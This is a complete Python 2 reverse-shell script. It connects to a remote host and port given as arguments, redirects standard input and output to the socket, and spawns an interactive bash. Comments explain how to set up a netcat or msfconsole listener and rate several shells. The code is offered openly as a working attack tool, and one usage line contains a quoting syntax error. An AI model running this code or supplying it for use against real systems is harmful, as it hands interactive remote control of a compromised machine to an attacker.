#!/usr/bin/python
#
# Reverse Shell v.1.1
# Bug Fixes
# Tested On - Unix/Linux
# It Connects to Host & Port given to It
# 
# Set Listener such as Netcat, Msfconsole or other ones
# Example nc -lvp 443 
# Requirements pip install termcolor

import socket
import sys
import os
import subprocess
#from termcolor import*

# Description
if len(sys.argv) != 3: 
	#print(colored("Usage - ./RShell.py [REMOTE-SERVER] [PORT]",'yellow'))
	#print(colored("Example - ./RShell.py 195.168.3.67 80",'yellow'))
	print "Usage - ./ReverseShell_V1.1.py [REMOTE-SERVER] [PORT]"
	print "Usage - ./ReverseShell_V1.1.py" 8.8.8.8 22"
	sys.exit()

# Global Variables
r_Server = sys.argv[1]
r_Port   = int(sys.argv[2])
	

def Reverse_Shell(r_Server, r_Port): 
	try: 
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((r_Server, r_Port)) 
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1) 
		os.dup2(s.fileno(),2)   # Set here different Shell Envirioment
		shell = subprocess.call(["/bin/bash", "-i"])
	except Exception, e: # if Connection is Refused by Server
		#print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server
		print "[!] CONNECTION REFUSED" + r_Server
		sys.exit(1)
Reverse_Shell(r_Server, r_Port)


#          <Shell Envirioment >
# ash  "Not Tested"
# bash "Good Interactive [Tested] Set as Default" commonly used on UNIX OS
# dash "Bad Interactive [Not Tested]"
# ksh  "[Not Tested]"
# zsh  "[Not Teste]d"
# csh  "[Not Tested]"
# es   "[Not Tested]"
# fish "[Not Tested]"
# rc   "Excellent [Tested]"
# scsh "Excellent [Tested]"
# wish "Excellent [Tested]" 
